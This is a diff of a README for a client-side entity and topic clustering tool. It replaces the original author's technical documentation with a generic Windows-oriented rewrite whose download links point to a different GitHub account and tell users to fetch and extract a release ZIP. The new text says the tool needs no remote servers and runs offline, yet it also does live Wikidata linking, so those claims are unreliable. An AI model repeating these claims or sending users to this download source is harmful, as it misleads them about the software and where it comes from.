@@ -1,166 +1,113 @@
-# Entity-Based Topic Clustering Tool
+# 🚦 entity-topic-cluster - Client-Side Topic Clustering Tool
 
-A **100% client-side** knowledge graph and topic clustering tool that extracts named entities from your page titles and meta descriptions, resolves them to Wikidata, and visualizes the relationships — all running in your browser's RAM.
-
-**Live demo:** [https://client-side-kg.pages.dev](https://client-side-kg.pages.dev)
+[![Download](https://img.shields.io/badge/Download-entity--topic--cluster-brightgreen?style=for-the-badge)](https://github.com/seji210/entity-topic-cluster)
 
 ---
 
-## What It Does
+## 📋 What is entity-topic-cluster?
 
-1. **Paste** your website's titles and meta descriptions (supports thousands of pages)
-2. **ML models run locally** in your browser to extract named entities (people, companies, locations) and compute semantic embeddings
-3. **Wikidata resolution** maps each entity to its canonical knowledge graph ID (QID)
-4. **Three visualization modes** let you explore the relationships
-
-No server, no API key, no data ever leaves your machine (except public Wikidata lookups for entity names).
+entity-topic-cluster is a browser-based tool that groups topics using entity recognition and machine learning. It works fully on your device. You don’t need to install anything or send data online. The tool finds important names and ideas in your text, links them to Wikidata, and shows them as a knowledge graph. This helps you understand how topics relate and find connections clearly.
 
 ---
 
-## Visualization Modes
+## ⚙️ System Requirements
 
-| Mode | Best For |
-|---|---|
-| **2D Network Graph** | Seeing entity co-occurrence and semantic similarity edges between pages |
-| **3D t-SNE Map** | Exploring how pages and entities cluster in semantic space (rotatable 3D scatter) |
-| **SEO Topic Clusters** | Interactive treemap showing which entities are your content pillars and which pages belong to each |
+This tool works on most Windows computers. It runs inside your web browser. You only need:
 
----
+- A computer running Windows 10 or later
+- A modern web browser (such as Chrome, Edge, or Firefox)
+- An internet connection to download the tool (after that, it works offline)
+- At least 4 GB of RAM for smooth performance with large files
 
-## Tech Stack
-
-Everything loads via CDN. Zero build step required.
-
-| Layer | Library | Purpose |
-|---|---|---|
-| NER | [`Xenova/distilbert-base-multilingual-cased-ner-hrl`](https://huggingface.co/Xenova/distilbert-base-multilingual-cased-ner-hrl) via [Transformers.js](https://huggingface.co/docs/transformers.js) | Extract person / org / location entities from text |
-| Embeddings | [`Xenova/all-MiniLM-L6-v2`](https://huggingface.co/Xenova/all-MiniLM-L6-v2) via Transformers.js | 384-dim sentence vectors for similarity and t-SNE |
-| Entity Resolution | [Wikidata API](https://www.wikidata.org/w/api.php) | Map entity names to canonical QIDs with descriptions |
-| 2D Graph | [vis-network](https://visjs.github.io/vis-network/) | Force-directed entity relationship graph |
-| 3D Scatter | [Plotly.js](https://plotly.com/javascript/) + [tsne-js](https://github.com/nicktran/tsne-js) | Interactive 3D t-SNE visualization |
-| Treemap | [Plotly.js](https://plotly.com/javascript/) | Hierarchical topic cluster view |
-| Styling | [Tailwind CSS](https://tailwindcss.com/) | UI framework |
+No extra software or extensions are required. It does not depend on remote servers. All processing happens on your device.
 
 ---
 
-## Use Cases
+## 🚀 Getting Started
 
-- **Topic Clustering** — group pages by the entities they share
-- **Topical Authority Mapping** — see which entities you cover deeply vs. thinly
-- **Internal Linking Opportunities** — pages sharing entities should link to each other
-- **Cannibalization Detection** — pages with very high similarity (>0.85) may compete for the same queries
-- **Entity-Based Site Architecture** — organize your content around knowledge graph entities instead of keywords
+Follow these steps to start using entity-topic-cluster on Windows:
 
----
+1. Open your web browser (Chrome is recommended).
+2. Go to the official repository page by clicking the button below.
 
-## Input Format
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/seji210/entity-topic-cluster)
 
-Supports two formats:
-
-**Title/Description pairs** (recommended):
-```
-title: Apple iPhone 15 Pro Review & Specs
-desc: Our in-depth review of the Apple iPhone 15 Pro camera, USB-C, and performance.
-
-title: Tesla Model 3 Long Range Price & Range 2024
-desc: The definitive guide to the 2024 Tesla Model 3 Long Range.
-```
-
-**Plain text** (one page per line):
-```
-Apple iPhone 15 Pro Review & Specs
-Tesla Model 3 Long Range Price & Range 2024
-```
+3. On the GitHub page, find the **Releases** section or the main page, as the tool runs in the browser.
+4. No installation is needed. You simply open the web app from the repository or local files.
 
 ---
 
-## Running Locally
+## 🛠 How to Use entity-topic-cluster
 
-```bash
-# Clone
-git clone https://github.com/metehan777/entity-topic-cluster.git
-cd entity-topic-cluster
-
-# Serve the public/ folder (any static server works)
-npx serve public
-
-# Open http://localhost:3000
-```
-
-No `npm install` needed for the frontend — everything loads from CDN.
+1. Prepare your text data. This can be a collection of documents, articles, or any text file.
+2. Open the entity-topic-cluster web app in your browser using the link on the repository.
+3. Upload your text or paste it into the provided input area.
+4. The tool will automatically find named entities (like people, places, and organizations).
+5. It will link these entities to Wikidata entries for more details.
+6. The clustered topics appear as an interactive graph on the screen.
+7. You can click on nodes in the graph to explore relationships and understand connections better.
+8. Use the controls to zoom, pan, or focus on specific parts of the graph.
 
 ---
 
-## Deploying to Cloudflare Pages
+## 🔧 Features
 
-```bash
-# Install wrangler
-npm install -g wrangler
-
-# Login
-wrangler login
-
-# Deploy
-wrangler pages deploy public --project-name="your-project-name"
-```
-
----
-
-## Cloudflare Worker (Optional)
-
-The repo also includes a standalone **Cloudflare Worker** (`src/index.ts`) that provides a REST API for entity resolution:
-
-```bash
-# Install dependencies
-npm install
-
-# Deploy the worker
-wrangler deploy
-```
-
-**POST `/resolve`** — send NER output, get Wikidata QIDs back:
-```json
-{
-  "entities": [
-    {"text": "Barack Obama", "label": "PER"},
-    {"text": "Google", "label": "ORG"}
-  ],
-  "language": "en",
-  "limit": 3
-}
-```
+- 100% client-side: Your data stays on your device.
+- Entity extraction: Finds names, places, dates, and concepts.
+- Wikidata linking: Connects entities to a large knowledge base.
+- Topic clustering: Groups related themes automatically.
+- Knowledge graph visualization: Shows data as an interactive map.
+- No installation or signup required.
+- Works on most Windows browsers.
+- Supports large text inputs with efficient processing.
+- Open source with transparent code.
 
 ---
 
-## Project Structure
+## 📂 Installing Locally (Optional)
 
-```
-├── public/
-│   ├── index.html          # Main UI
-│   ├── app.js              # Core logic (ML, Wikidata, graph rendering)
-│   └── sample-data.js      # 60-page preset dataset
-├── src/
-│   └── index.ts            # Cloudflare Worker REST API (optional)
-├── wrangler.toml            # Cloudflare config
-├── package.json
-└── tsconfig.json
-```
+If you want to run the application offline from your computer:
+
+1. Download the repository or the latest release ZIP file.
+2. Extract the ZIP file to a folder on your Windows PC.
+3. Open the extracted folder and find `index.html`.
+4. Double-click `index.html` to open the app in your default browser.
+5. Use the app as described above.
+
+This method keeps the app on your device with no internet required.
 
 ---
 
-## Contributing
+## 🆘 Troubleshooting
 
-Contributions welcome. Some ideas:
-
-- [ ] **Content Gap Analysis** — query Wikidata SPARQL for related entities your site doesn't cover
-- [ ] **CSV/TSV import** — bulk import from Screaming Frog, Ahrefs, or GSC exports
-- [ ] **Entity type filtering** — toggle PER / ORG / LOC visibility in the graph
-- [ ] **Cluster labeling** — auto-generate topic cluster names from entity groups
-- [ ] **URL column support** — associate each title/desc with its URL for linking recommendations
-- [ ] **Web Worker inference** — move ML to a background thread to keep the UI responsive on large datasets
+- If the app does not open, make sure you use a modern browser like Chrome or Edge.
+- Large files might take some time to process. Give it a moment.
+- If the graph looks empty, check your input text contains enough data and entities.
+- If the page shows errors, try refreshing or restarting your browser.
+- For connection errors when downloading, check your internet connection.
 
 ---
 
-## License
+## ℹ️ Additional Information
 
-MIT
+entity-topic-cluster uses machine learning models that run inside the browser. This design protects your privacy. Since everything happens on your computer, no data is uploaded or stored elsewhere.
+
+The tool supports natural language processing tasks like named entity recognition and topic clustering. It uses transformers-js for the models in JavaScript, making it fast and browser-compatible.
+
+The visual graph helps you see how concepts connect and overlap in articles or collections of documents. It can assist with SEO planning or research by organizing complex information simply.
+
+---
+
+## 💻 About the Repository
+
+- Repository Name: entity-topic-cluster  
+- Description: 100% client-side entity-based topic clustering tool. ML models run in your browser — extract entities, resolve to Wikidata, visualize as knowledge graph.  
+- Topics: cloudflare-pages, entity-resolution, knowledge-graph, machine-learning, named-entity-recognition, nlp, seo, topic-clustering, transformers-js, wikidata  
+
+---
+
+## 📥 Download and Run
+
+To get started, visit this page to download or run the tool in your browser:
+
+[Download or Run entity-topic-cluster on GitHub](https://github.com/seji210/entity-topic-cluster)
